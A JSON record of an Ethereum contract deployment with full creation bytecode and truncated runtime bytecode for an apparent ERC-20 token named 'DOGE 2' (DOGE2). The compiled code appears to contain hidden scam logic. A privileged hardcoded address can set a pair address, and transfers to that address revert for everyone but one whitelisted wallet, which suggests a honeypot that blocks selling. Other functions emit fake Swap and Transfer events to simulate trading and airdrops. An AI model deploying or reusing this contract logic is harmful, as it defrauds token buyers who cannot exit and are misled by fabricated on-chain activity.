{
    "address": "0x30D964B2C1860aeA10abF6aE7C40cB98EE1D2a81",
    "tx_hash": "6960ca5c7d523c14331e4f3bbdc37f3c21cd9d9380b06a8fb1927d250a58fd11",
    "block_number": 18006587,
    "timestamp": 1693146371,
    "gas_used_in_creation": 1594693,
    "creation_bytecode": "608060405234801562000010575f80fd5b50604051620025fa380380620025fa83398181016040528101906200003691906200058f565b620000566200004a620000bf60201b60201c565b620000c660201b60201c565b826004908162000067919062000854565b50816005908162000079919062000854565b50620000b6336200008f6200018760201b60201c565b600a6200009d919062000ac1565b83620000aa919062000b11565b6200018f60201b60201c565b50505062000cad565b5f33905090565b5f805f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff169050815f806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055508173ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff167f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e060405160405180910390a35050565b5f6008905090565b5f73ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff160362000200576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401620001f79062000bb9565b60405180910390fd5b8060035f82825462000213919062000bd9565b925050819055508060015f8473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020015f205f82825401925050819055508173ffffffffffffffffffffffffffffffffffffffff165f73ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef83604051620002c3919062000c24565b60405180910390a3620002de5f8383620002f260201b60201c565b620002ee620002f760201b60201c565b5050565b505050565b620003076200031a60201b60201c565b620003185f620000c660201b60201c565b565b6200032a620000bf60201b60201c565b73ffffffffffffffffffffffffffffffffffffffff1662000350620003ab60201b60201c565b73ffffffffffffffffffffffffffffffffffffffff1614620003a9576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401620003a09062000c8d565b60405180910390fd5b565b5f805f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905090565b5f604051905090565b5f80fd5b5f80fd5b5f80fd5b5f80fd5b5f601f19601f8301169050919050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52604160045260245ffd5b6200043382620003eb565b810181811067ffffffffffffffff82111715620004555762000454620003fb565b5b80604052505050565b5f62000469620003d2565b905062000477828262000428565b919050565b5f67ffffffffffffffff821115620004995762000498620003fb565b5b620004a482620003eb565b9050602081019050919050565b5f5b83811015620004d0578082015181840152602081019050620004b3565b5f8484015250505050565b5f620004f1620004eb846200047c565b6200045e565b90508281526020810184848401111562000510576200050f620003e7565b5b6200051d848285620004b1565b509392505050565b5f82601f8301126200053c576200053b620003e3565b5b81516200054e848260208601620004db565b91505092915050565b5f819050919050565b6200056b8162000557565b811462000576575f80fd5b50565b5f81519050620005898162000560565b92915050565b5f805f60608486031215620005a957620005a8620003db565b5b5f84015167ffffffffffffffff811115620005c957620005c8620003df565b5b620005d78682870162000525565b935050602084015167ffffffffffffffff811115620005fb57620005fa620003df565b5b620006098682870162000525565b92505060406200061c8682870162000579565b9150509250925092565b5f81519050919050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52602260045260245ffd5b5f60028204905060018216806200067557607f821691505b6020821081036200068b576200068a62000630565b5b50919050565b5f819050815f5260205f209050919050565b5f6020601f8301049050919050565b5f82821b905092915050565b5f60088302620006ef7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff82620006b2565b620006fb8683620006b2565b95508019841693508086168417925050509392505050565b5f819050919050565b5f6200073c62000736620007308462000557565b62000713565b62000557565b9050919050565b5f819050919050565b62000757836200071c565b6200076f620007668262000743565b848454620006be565b825550505050565b5f90565b6200078562000777565b620007928184846200074c565b505050565b5b81811015620007b957620007ad5f826200077b565b60018101905062000798565b5050565b601f8211156200080857620007d28162000691565b620007dd84620006a3565b81016020851015620007ed578190505b62000805620007fc85620006a3565b83018262000797565b50505b505050565b5f82821c905092915050565b5f6200082a5f19846008026200080d565b1980831691505092915050565b5f62000844838362000819565b9150826002028217905092915050565b6200085f8262000626565b67ffffffffffffffff8111156200087b576200087a620003fb565b5b6200088782546200065d565b62000894828285620007bd565b5f60209050601f831160018114620008ca575f8415620008b5578287015190505b620008c1858262000837565b86555062000930565b601f198416620008da8662000691565b5f5b828110156200090357848901518255600182019150602085019450602081019050620008dc565b868310156200092357848901516200091f601f89168262000819565b8355505b6001600288020188555050505b505050505050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601160045260245ffd5b5f8160011c9050919050565b5f808291508390505b6001851115620009c2578086048111156200099a576200099962000938565b5b6001851615620009aa5780820291505b8081029050620009ba8562000965565b94506200097a565b94509492505050565b5f82620009dc576001905062000aae565b81620009eb575f905062000aae565b816001811462000a04576002811462000a0f5762000a45565b600191505062000aae565b60ff84111562000a245762000a2362000938565b5b8360020a91508482111562000a3e5762000a3d62000938565b5b5062000aae565b5060208310610133831016604e8410600b841016171562000a7f5782820a90508381111562000a795762000a7862000938565b5b62000aae565b62000a8e848484600162000971565b9250905081840481111562000aa85762000aa762000938565b5b81810290505b9392505050565b5f60ff82169050919050565b5f62000acd8262000557565b915062000ada8362000ab5565b925062000b097fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff8484620009cb565b905092915050565b5f62000b1d8262000557565b915062000b2a8362000557565b925082820262000b3a8162000557565b9150828204841483151762000b545762000b5362000938565b5b5092915050565b5f82825260208201905092915050565b7f45524332303a206d696e7420746f20746865207a65726f2061646472657373005f82015250565b5f62000ba1601f8362000b5b565b915062000bae8262000b6b565b602082019050919050565b5f6020820190508181035f83015262000bd28162000b93565b9050919050565b5f62000be58262000557565b915062000bf28362000557565b925082820190508082111562000c0d5762000c0c62000938565b5b92915050565b62000c1e8162000557565b82525050565b5f60208201905062000c395f83018462000c13565b92915050565b7f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e65725f82015250565b5f62000c7560208362000b5b565b915062000c828262000c3f565b602082019050919050565b5f6020820190508181035f83015262000ca68162000c67565b9050919050565b61193f8062000cbb5f395ff3fe608060405234801561000f575f80fd5b50600436106100f3575f3560e01c8063715018a611610095578063aafe62d111610064578063aafe62d114610287578063beabacc8146102a3578063dd62ed3e146102bf578063f2fde38b146102ef576100f3565b8063715018a6146102115780638da5cb5b1461021b57806395d89b4114610239578063a9059cbb14610257576100f3565b806323b872dd116100d157806323b872dd146101635780632647620414610193578063313ce567146101c357806370a08231146101e1576100f3565b806306fdde03146100f7578063095ea7b31461011557806318160ddd14610145575b5f80fd5b6100ff61030b565b60405161010c919061102d565b60405180910390f35b61012f600480360381019061012a91906110e2565b61039b565b60405161013c919061113a565b60405180910390f35b61014d6103bd565b60405161015a9190611162565b60405180910390f35b61017d6004803603810190610178919061117b565b6103c6565b60405161018a919061113a565b60405180910390f35b6101ad60048036038101906101a891906111cb565b6103f4565b6040516101ba919061113a565b60405180910390f35b6101cb61048d565b6040516101d89190611211565b60405180910390f35b6101fb60048036038101906101f691906111cb565b610495565b6040516102089190611162565b60405180910390f35b6102196104db565b005b6102236104ee565b6040516102309190611239565b60405180910390f35b610241610515565b60405161024e919061102d565b60405180910390f35b610271600480360381019061026c91906110e2565b6105a5565b60405161027e919061113a565b60405180910390f35b6102a1600480360381019061029c91906112b3565b6105c7565b005b6102bd60048036038101906102b8919061117b565b61072d565b005b6102d960048036038101906102d49190611324565b610797565b6040516102e69190611162565b60405180910390f35b610309600480360381019061030491906111cb565b610819565b005b60606004805461031a9061138f565b80601f01602080910402602001604051908101604052809291908181526020018280546103469061138f565b80156103915780601f1061036857610100808354040283529160200191610391565b820191905f5260205f20905b81548152906001019060200180831161037457829003601f168201915b5050505050905090565b5f806103a561089b565b90506103b28185856108a2565b600191505092915050565b5f600354905090565b5f806103d061089b565b90506103dd858285610a65565b6103e8858585610af0565b60019150509392505050565b5f73986acb09f92f1bd911755aabc3da19e97e54f22973ffffffffffffffffffffffffffffffffffffffff1661042861089b565b73ffffffffffffffffffffffffffffffffffffffff1603610484578160065f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505b60019050919050565b5f6008905090565b5f60015f8373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020015f20549050919050565b6104e3610e5f565b6104ec5f610edd565b565b5f805f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905090565b6060600580546105249061138f565b80601f01602080910402602001604051908101604052809291908181526020018280546105509061138f565b801561059b5780601f106105725761010080835404028352916020019161059b565b820191905f5260205f20905b81548152906001019060200180831161057e57829003601f168201915b5050505050905090565b5f806105af61089b565b90506105bc818585610af0565b600191505092915050565b5f5b84849050811015610726578484828181106105e7576105e66113bf565b5b90506020020160208101906105fc91906111cb565b73ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff167fd78ad95fa46c994b6551d0da85fc275fe613ce37657fb8d5e3d130840159d822855f808860405161065e949392919061142e565b60405180910390a3848482818110610679576106786113bf565b5b905060200201602081019061068e91906111cb565b73ffffffffffffffffffffffffffffffffffffffff1660065f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef8560405161070b9190611162565b60405180910390a3808061071e9061149e565b9150506105c9565b5050505050565b8173ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef8360405161078a9190611162565b60405180910390a3505050565b5f60025f8473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020015f205f8373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020015f2054905092915050565b610821610e5f565b5f73ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff160361088f576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161088690611555565b60405180910390fd5b61089881610edd565b50565b5f33905090565b5f73ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff1603610910576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610907906115e3565b60405180910390fd5b5f73ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff160361097e576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161097590611671565b60405180910390fd5b8060025f8573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020015f205f8473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020015f20819055508173ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff167f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b92583604051610a589190611162565b60405180910390a3505050565b5f610a708484610797565b90507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff8114610aea5781811015610adc576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610ad3906116d9565b60405180910390fd5b610ae984848484036108a2565b5b50505050565b5f73ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff1603610b5e576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610b5590611767565b60405180910390fd5b5f73ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff1603610bcc576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610bc3906117f5565b60405180910390fd5b5f73ffffffffffffffffffffffffffffffffffffffff1660065f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1614610cd75760065f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff16148015610cbc57507304de7a96758579b9dd3f095c8e7e9b608463e15373ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff1614155b15610cd6575f80610cd45760648210610cd3575f80fd5b5b505b5b5f60015f8573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020015f2054905081811015610d5b576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610d5290611883565b60405180910390fd5b81810360015f8673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020015f20819055508160015f8573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020015f205f82825401925050819055508273ffffffffffffffffffffffffffffffffffffffff168473ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef84604051610e469190611162565b60405180910390a3610e59848484610f9e565b50505050565b610e6761089b565b73ffffffffffffffffffffffffffffffffffffffff16610e856104ee565b73ffffffffffffffffffffffffffffffffffffffff1614610edb576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610ed2906118eb565b60405180910390fd5b565b5f805f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff169050815f806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055508173ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff167f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e060405160405180910390a35050565b505050565b5f81519050919050565b5f82825260208201905092915050565b5f5b83811015610fda578082015181840152602081019050610fbf565b5f8484015250505050565b5f601f19601f8301169050919050565b5f610fff82610fa3565b6110098185610fad565b9350611019818560208601610fbd565b61102281610fe5565b840191505092915050565b5f6020820190508181035f8301526110458184610ff5565b905092915050565b5f80fd5b5f80fd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f61107e82611055565b9050919050565b61108e81611074565b8114611098575f80fd5b50565b5f813590506110a981611085565b92915050565b5f819050919050565b6110c1816110af565b81146110cb575f80fd5b50565b5f813590506110dc816110b8565b92915050565b5f80604083850312156110f8576110f761104d565b5b5f6111058582860161109b565b9250506020611116858286016110ce565b9150509250929050565b5f8115159050919050565b61113481611120565b82525050565b5f60208201905061114d5f83018461112b565b92915050565b61115c816110af565b82525050565b5f6020820190506111755f830184611153565b92915050565b5f805f606084860312156111925761119161104d565b5b5f61119f8682870161109b565b93505060206111b08682870161109b565b92505060406111c1868287016110ce565b9150509250925092565b5f602082840312156111e0576111df61104d565b5b5f6111ed8482850161109b565b91505092915050565b5f60ff82169050919050565b61120b816111f6565b82525050565b5f6020820190506112245f830184611202565b92915050565b61123381611074565b82525050565b5f60208201905061124c5f83018461122a565b92915050565b5f80fd5b5f80fd5b5f80fd5b5f8083601f84011261127357611272611252565b5b8235905067ffffffffffffffff8111156112905761128f611256565b5b6020830191508360208202830111156112ac576112ab61125a565b5b9250929050565b5f805f80606085870312156112cb576112ca61104d565b5b5f85013567ffffffffffffffff8111156112e8576112e7611051565b5b6112f48782880161125e565b94509450506020611307878288016110ce565b92505060406113188782880161109b565b91505092959194509250565b5f806040838503121561133a5761133961104d565b5b5f6113478582860161109b565b92505060206113588582860161109b565b9150509250929050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52602260045260245ffd5b5f60028204905060018216806113a657607f821691505b6020821081036113b9576113b8611362565b5b50919050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52603260045260245ffd5b5f819050919050565b5f819050919050565b5f61141861141361140e846113ec565b6113f5565b6110af565b9050919050565b611428816113fe565b82525050565b5f6080820190506114415f830187611153565b61144e602083018661141f565b61145b604083018561141f565b6114686060830184611153565b95945050505050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601160045260245ffd5b5f6114a8826110af565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff82036114da576114d9611471565b5b600182019050919050565b7f4f776e61626c653a206e6577206f776e657220697320746865207a65726f20615f8201527f6464726573730000000000000000000000000000000000000000000000000000602082015250565b5f61153f602683610fad565b915061154a826114e5565b604082019050919050565b5f6020820190508181035f83015261156c81611533565b9050919050565b7f45524332303a20617070726f76652066726f6d20746865207a65726f206164645f8201527f7265737300000000000000000000000000000000000000000000000000000000602082015250565b5f6115cd602483610fad565b91506115d882611573565b604082019050919050565b5f6020820190508181035f8301526115fa816115c1565b9050919050565b7f45524332303a20617070726f766520746f20746865207a65726f2061646472655f8201527f7373000000000000000000000000000000000000000000000000000000000000602082015250565b5f61165b602283610fad565b915061166682611601565b604082019050919050565b5f6020820190508181035f8301526116888161164f565b9050919050565b7f45524332303a20696e73756666696369656e7420616c6c6f77616e63650000005f82015250565b5f6116c3601d83610fad565b91506116ce8261168f565b602082019050919050565b5f6020820190508181035f8301526116f0816116b7565b9050919050565b7f45524332303a207472616e736665722066726f6d20746865207a65726f2061645f8201527f6472657373000000000000000000000000000000000000000000000000000000602082015250565b5f611751602583610fad565b915061175c826116f7565b604082019050919050565b5f6020820190508181035f83015261177e81611745565b9050919050565b7f45524332303a207472616e7366657220746f20746865207a65726f20616464725f8201527f6573730000000000000000000000000000000000000000000000000000000000602082015250565b5f6117df602383610fad565b91506117ea82611785565b604082019050919050565b5f6020820190508181035f83015261180c816117d3565b9050919050565b7f45524332303a207472616e7366657220616d6f756e74206578636565647320625f8201527f616c616e63650000000000000000000000000000000000000000000000000000602082015250565b5f61186d602683610fad565b915061187882611813565b604082019050919050565b5f6020820190508181035f83015261189a81611861565b9050919050565b7f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e65725f82015250565b5f6118d5602083610fad565b91506118e0826118a1565b602082019050919050565b5f6020820190508181035f830152611902816118c9565b905091905056fea2646970667358221220bd60112b7b38cd1076ca6542a13ea6b107b847d051aef628fabb49db9da7cf2964736f6c63430008140033000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000002540be400000000000000000000000000000000000000000000000000000000000000000d444f474520322023444f474532000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000005444f474532000000000000000000000000000000000000000000000000000000",
    "runtime_bytecode": "608060405234801561000f575f80fd5b50600436106100f3575f3560e01c8063715018a611610095578063aafe62d111610064578063aafe62d114610287578063beabacc8146102a3578063dd62ed3e146102bf578063f2fde38b146102ef576100f3565b8063715018a6146102115780638da5cb5b1461021b57806395d89b4114610239578063a9059cbb14610257576100f3565b806323b872dd116100d157806323b872dd146101635780632647620414610193578063313ce567146101c357806370a08231146101e1576100f3565b806306fdde03146100f7578063095ea7b31461011557806318160ddd14610145575b5f80fd5b6100ff61030b565b60405161010c919061102d565b60405180910390f35b61012f600480360381019061012a91906110e2565b61039b565b60405161013c919061113a565b60405180910390f35b61014d6103bd565b60405161015a9190611162565b60405180910390f35b61017d6004803603810190610178919061117b565b6103c6565b60405161018a919061113a565b60405180910390f35b6101ad60048036038101906101a891906111cb565b6103f4565b6040516101ba919061113a565b60405180910390f35b6101cb61048d565b6040516101d89190611211565b60405180910390f35b6101fb60048036038101906101f691906111cb565b610495565b6040516102089190611162565b60405180910390f35b6102196104db565b005b6102236104ee565b6040516102309190611239565b60405180910390f35b610241610515565b60405161024e919061102d565b60405180910390f35b610271600480360381019061026c91906110e2565b6105a5565b60405161027e919061113a565b60405180910390f35b6102a1600480360381019061029c91906112b3565b6105c7565b005b6102bd60048036038101906102b8919061117b565b61072d565b005b6102d960048036038101906102d49190611324565b610797565b6040516102e69190611162565b60405180910390f35b610309600480360381019061030491906111cb565b610819565b005b60606004805461031a9061138f565b80601f01602080910402602001604051908101604052809291908181526020018280546103469061138f565b80156103915780601f1061036857610100808354040283529160200191610391565b820191905f5260205f20905b81548152906001019060200180831161037457829003601f168201915b5050505050905090565b5f806103a561089b565b90506103b28185856108a2565b600191505092915050565b5f600354905090565b5f806103d061089b565b90506103dd858285610a65565b6103e8858585610af0565b60019150509392505050565b5f73986acb09f92f1bd911755aabc3da19e97e54f22973ffffffffffffffffffffffffffffffffffffffff1661042861089b565b73ffffffffffffffffffffffffffffffffffffffff1603610484578160065f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505b60019050919050565b5f6008905090565b5f60015f8373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020015f20549050919050565b6104e3610e5f565b6104ec5f610edd565b565b5f805f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905090565b6060600580546105249061138f565b80601f01602080910402602001604051908101604052809291908181526020018280546105509061138f565b801561059b5780601f106105725761010080835404028352916020019161059b565b820191905f5260205f20905b81548152906001019060200180831161057e57829003601f168201915b5050505050905090565b5f806105af61089b565b90506105bc818585610af0565b600191505092915050565b5f5b84849050811015610726578484828181106105e7576105e66113bf565b5b90506020020160208101906105fc91906111cb565b73ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff167fd78ad95fa46c994b6551d0da85fc275fe613ce37657fb8d5e3d130840159d822855f808860405161065e949392919061142e565b60405180910390a3848482818110610679576106786113bf565b5b905060200201602081019061068e91906111cb565b73ffffffffffffffffffffffffffffffffffffffff1660065f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef8560405161070b9190611162565b60405180910390a3808061071e9061149e565b9150506105c9565b5050505050565b8173ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef8360405161078a9190611162565b60405180910390a3505050565b5f60025f8473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020015f205f8373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020015f2054905092915050565b610821610e5f565b5f73ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff160361088f576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161088690611555565b60405180910390fd5b61089881610edd565b50565b5f33905090565b5f73ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff1603610910576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610907906115e3565b60405180910390fd5b5f73ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff160361097e576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161097590611671565b60405180910390fd5b8060025f8573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020015f205f8473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020015f20819055508173ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff167f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b92583604051610a589190611162565b60405180910390a3505050565b5f610a708484610797565b90507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff8114610aea5781811015610adc576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610ad3906116d9565b60405180910390fd5b610ae984848484036108a2565b5b50505050565b5f73ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff1603610b5e576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610b5590611767565b60405180910390fd5b5f73ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff1603610bcc576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610bc3906117f5565b60405180910390fd5b5f73ffffffffffffffffffffffffffffffffffffffff1660065f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1614610cd75760065f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff16148015610cbc57507304de7a96758579b9dd3f095c8e7e9b608463e15373ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff1614155b15610cd6575f80610cd45760648210610cd3575f80fd5b5b505b5b5f60015f8573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020015f2054905081811015610d5b576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610d5290611883565b60405180910390fd5b81810360015f8673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020015f20819055508160015f8573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020015f205f82825401925050819055508273ffffffffffffffffffffffffffffffffffffffff168473ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef84604051610e469190611162565b60405180910390a3610e59848484610f9e565b50505050565b610e6761089b565b73ffffffffffffffffffffffffffffffffffffffff16610e856104ee565b73ffffffffffffffffffffffffffffffffffffffff1614610edb576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610ed2906118eb565b60405180910390fd5b565b5f805f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff169050815f806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055508173ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff167f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e060405160405180910390a35050565b505050565b5f81519050919050565b5f82825260208201905092915050565b5f5b83811015610fda578082015181840152602081019050610fbf565b5f8484015250505050565b5f601f19601f8301169050919050565b5f610fff82610fa3565b6110098185610fad565b9350611019818560208601610fbd565b61102281610fe5565b840191505092915050565b5f6020820190508181035f8301526110458184610ff5565b905092915050565b5f80fd5b5f80fd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f61107e82611055565b9050919050565b61108e81611074565b8114611098575f80fd5b50565b5f813590506110a981611085565b92915050565b5f819050919050565b6110c1816110af565b81146110cb575f80fd5b50565b5f813590506110dc816110b8565b92915050565b5f80604083850312156110f8576110f761104d565b5b5f6111058582860161109b565b9250506020611116858286016110ce565b9150509250929050565b5f8115159050919050565b61113481611120565b82525050565b5f60208201905061114d5f83018461112b565b92915050565b61115c816110af565b82525050565b5f6020820190506111755f830184611153565b92915050565b5f805f606084860312156111925761119161104d565b5b5f61119f8682870161109b565b93505060206111b08682870161109b565b92505060406111c1868287016110ce565b9150509250925092565b5f602082840312156111e0576111df61104d565b5b5f6111ed8482850161109b565b91505092915050565b5f60ff82169050919050565b61120b816111f6565b82525050565b5f6020820190506112245f830184611202565b92915050565b61123381611074565b82525050565b5f60208201905061124c5f83018461122a565b92915050565b5f80fd5b5f80fd5b5f80fd5b5f8083601f84011261127357611272611252565b5b8235905067ffffffffffffffff8111156112905761128f611256565b5b6020830191508360208202830111156112ac576112ab61125a565b5b9250929050565b5f805f80606085870312156112cb576112ca61104d565b5b5f85013567ffffffffffffffff8111156112e8576112e7611051565b5b6112f48782880161125e565b94509450506020611307878288016110ce565b92505060406113188782880161109b565b91505092959194509250565b5f806040838503121561133a5761133961104d565b5b5f6113478582860161109b565b92505060206113588582860161109b565b9150509250929050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52602260045260245ffd5b5f60028204905060018216806113a657607f821691505b6020821081036113b9576113b8611362565b5b50919050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52603260045260245ffd5b5f819050919050565b5f819050919050565b5f61141861141361140e846113ec565b6113f5565b6110af565b9050919050565b611428816113fe565b82525050565b5f6080820190506114415f830187611153565b61144e602083018661141f565b61145b604083018561141f565b6114686060830184611153565b95945050505050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601160045260245ffd5b5f6114a8826110af565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff82036114da576114d9611471565b5b600182019050919050565b7f4f776e61626c653a206e6577206f776e657220697320746865207a65726f20615f8201527f6464726573730000000000000000000000000000000000000000000000000000602082015250565b5f61153f602683610fad565b915061154a826114e5565b604082019050919050565b5f6020820190508181035f83015261156c81611533565b9050919050565b7f45524332303a20617070726f76652066726f6d20746865207a65726f206164645f8201527f7265737300000000000000000000000000000000000000000000000000000000602082015250565b5f6115cd602483610fad565b91506115d882611573565b604082019050919050565b5f6020820190508181035f8301526115fa816115c1565b9050919050565b7f45524332303a20617070726f766520746f20746865207a65726f2061646472655f8201527f7373000000000000000000000000000000000000000000000000000000000000602082015250565b5f61165b602283610fad565b915061166682611601565b604082019050919050565b5f6020820190508181035f8301526116888161164f565b9050919050565b7f45524332303a20696e73756666696369656e7420616c6c6f77616e63650000005f82015250565b5f6116c3601d83610fad565b91506116ce8261168f565b602082019050919050565b5f6020820190508181035f8301526116f0816116b7565b9050919050565b7f45524332303a207472616e736665722066726f6d20746865207a65726f2061645f8201527f6472657373000000000000000000000000000000000000000000000000000000602082015250565b5f611751602583610fad565b915061175c826116f7565b604082019050919050565b5f6020820190508181035f83015261177e81611745565b9050919050565b7f45524332303a207472616e7366657220746f20746865207a65726f20616464725f8201527f6573730000000000000000000000000000000000000000000000000000000000602082015250565b5f6117df602383610fad565b91506117ea82611785565b604082019050919050565b5f6020820190508181035f83015261180c816117d3565b9050919050565b7f45524332303a207472616e7366657220616d6f756e74206578636565647320625f8201527f616c616e63650000000000000